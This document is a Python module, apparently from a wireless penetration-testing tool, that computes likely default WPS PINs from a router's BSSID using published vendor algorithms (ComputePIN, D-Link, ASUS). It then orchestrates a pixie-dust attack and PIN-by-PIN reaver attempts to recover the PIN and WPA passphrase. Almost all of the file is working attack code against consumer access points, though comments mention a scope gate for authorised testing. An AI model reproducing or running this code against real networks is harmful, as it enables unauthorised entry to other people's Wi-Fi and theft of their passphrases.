# SPDX-License-Identifier: GPL-3.0-or-later
# Copyright (c) 2025 Nerds489
"""Offline WPS PIN algorithms and a PIN-list WPS attack orchestrator.

Many access points derive their default WPS PIN from the BSSID with a published
algorithm, so a short list of candidate PINs can be computed offline and tried
before any brute force. This module provides:

- the WPS PIN checksum (the 8th digit) and validation,
- the published default-PIN algorithms (ComputePIN/24-28-32-bit, D-Link, ASUS),
- :func:`candidate_pins`, an ordered, de-duplicated candidate list for a BSSID,
- :class:`WpsAttack`, which tries pixie-dust then the candidate PINs through the
  gated reaver adapter (every spawn still passes the scope gate).

Every generated PIN carries a valid checksum. The algorithms are faithful ports
of the widely-published implementations; the pure functions are unit-tested with
no radio.
"""
from __future__ import annotations

from collections.abc import Callable
from dataclasses import dataclass, field

from netreaper.core.logging import get_logger
from netreaper.core.validation import require_bssid
from netreaper.orchestration.events import Events, event_bus
from netreaper.tools.reaver import ReaverTool

logger = get_logger(__name__)

# Known static default PINs (already checksum-valid), tried first.
STATIC_PINS: tuple[int, ...] = (12345670, 0)


def pin_checksum(pin7: int) -> int:
    """Return the WPS check digit for a 7-digit PIN body."""
    accum = 0
    t = pin7
    while t:
        accum += 3 * (t % 10)
        t //= 10
        accum += t % 10
        t //= 10
    return (10 - accum % 10) % 10


def generate_pin(seed7: int) -> int:
    """Return a full 8-digit WPS PIN from a 7-digit body plus its checksum."""
    seed7 %= 10_000_000
    return seed7 * 10 + pin_checksum(seed7)


def is_valid_wps_pin(pin: int | str) -> bool:
    """True when ``pin`` is 8 digits and its checksum is correct."""
    s = str(pin).zfill(8)
    if len(s) != 8 or not s.isdigit():
        return False
    return pin_checksum(int(s[:7])) == int(s[7])


def format_pin(pin: int) -> str:
    """Zero-pad a PIN to the canonical 8-digit string."""
    return str(pin).zfill(8)


def _mac_to_int(bssid: str) -> int:
    require_bssid(bssid)  # malformed BSSID -> TargetValidationError, not ValueError
    return int(bssid.replace(":", "").replace("-", ""), 16)


def _mac_bytes(mac: int) -> list[int]:
    return [(mac >> (8 * (5 - i))) & 0xFF for i in range(6)]


# --- published default-PIN algorithms (return full 8-digit PINs) ---


def pin24(mac: int) -> int:
    """ComputePIN / 24-bit: the NIC (low 24 bits) of the MAC."""
    return generate_pin(mac & 0xFFFFFF)


def pin28(mac: int) -> int:
    return generate_pin(mac & 0xFFFFFFF)


def pin32(mac: int) -> int:
    return generate_pin(mac & 0xFFFFFFFF)


def pin_dlink(mac: int) -> int:
    """The published D-Link default-PIN algorithm."""
    nic = mac & 0xFFFFFF
    pin = nic ^ 0x55AA55
    pin ^= (
        ((pin & 0xF) << 4)
        + ((pin & 0xF) << 8)
        + ((pin & 0xF) << 12)
        + ((pin & 0xF) << 16)
        + ((pin & 0xF) << 20)
    )
    pin %= 10_000_000
    if pin < 1_000_000:
        pin += ((pin % 9) * 1_000_000) + 1_000_000
    return generate_pin(pin)


def pin_dlink1(mac: int) -> int:
    """D-Link variant computed from the MAC incremented by one."""
    return pin_dlink(mac + 1)


def pin_asus(mac: int) -> int:
    """The published ASUS default-PIN algorithm (adjacent MAC-byte sums)."""
    b = _mac_bytes(mac)
    digits = [(b[i % 6] + b[(i + 1) % 6]) % 10 for i in range(7)]
    return generate_pin(int("".join(str(d) for d in digits)))


# Ordered so the most common algorithms are tried first.
ALGORITHMS: tuple[tuple[str, Callable[[int], int]], ...] = (
    ("ComputePIN", pin24),
    ("D-Link", pin_dlink),
    ("D-Link+1", pin_dlink1),
    ("ASUS", pin_asus),
    ("28-bit", pin28),
    ("32-bit", pin32),
)


def candidate_pins(bssid: str) -> list[int]:
    """Return an ordered, de-duplicated list of candidate PINs for a BSSID."""
    mac = _mac_to_int(bssid)
    ordered: list[int] = [*STATIC_PINS]
    for _name, algo in ALGORITHMS:
        ordered.append(algo(mac))
    seen: set[int] = set()
    result: list[int] = []
    for pin in ordered:
        if pin not in seen:
            seen.add(pin)
            result.append(pin)
    return result


@dataclass
class WpsResult:
    bssid: str
    channel: int
    success: bool = False
    pin: str | None = None
    psk: str | None = None
    candidates: list[str] = field(default_factory=list)
    tried: int = 0
    pixie_dust: bool = False


class WpsAttack:
    """Try pixie-dust, then computed candidate PINs, via the gated reaver adapter."""

    def __init__(self, reaver: ReaverTool | None = None) -> None:
        self._reaver = reaver or ReaverTool()

    async def run(
        self,
        interface: str,
        bssid: str,
        channel: int,
        *,
        essid: str | None = None,
        pins: list[int] | None = None,
        try_pixie_dust: bool = True,
        per_pin_timeout: int = 60,
    ) -> WpsResult:
        candidates = pins if pins is not None else candidate_pins(bssid)
        result = WpsResult(
            bssid=bssid, channel=channel, candidates=[format_pin(p) for p in candidates]
        )

        if try_pixie_dust:
            data = await self._execute(
                bssid, {"interface": interface, "channel": channel,
                        "pixiedust": True, "essid": essid}
            )
            result.pixie_dust = True
            if self._succeeded(data):
                return self._win(result, data, data.get("pin"))

        for pin in candidates:
            result.tried += 1
            data = await self._execute(
                bssid,
                {"interface": interface, "channel": channel, "pin": format_pin(pin),
                 "essid": essid, "max_attempts": 1, "timeout": per_pin_timeout},
            )
            if self._succeeded(data):
                return self._win(result, data, data.get("pin") or format_pin(pin))

        return result

    async def _execute(self, bssid: str, options: dict) -> dict:
        # reaver.execute passes the scope gate (SINGLE_TARGET, DESTRUCTIVE); a
        # gate denial propagates from here and is never swallowed.
        res = await self._reaver.execute(bssid, options)
        return getattr(res, "data", res) or {}

    @staticmethod
    def _succeeded(data: dict) -> bool:
        return bool(data.get("psk")) or data.get("status") == "success"

    @staticmethod
    def _win(result: WpsResult, data: dict, pin: str | None) -> WpsResult:
        result.success = True
        result.pin = pin
        result.psk = data.get("psk")
        event_bus.emit(
            Events.WPS_PIN_FOUND,
            {"bssid": result.bssid, "pin": result.pin, "psk": result.psk},
        )
        logger.info("WPS PIN found for %s", result.bssid)
        return result


async def wps_attack(
    interface: str,
    bssid: str,
    channel: int,
    *,
    essid: str | None = None,
    try_pixie_dust: bool = True,
) -> WpsResult:
    """Stateless one-shot WPS attack for the CLI."""
    return await WpsAttack().run(
        interface, bssid, channel, essid=essid, try_pixie_dust=try_pixie_dust
    )
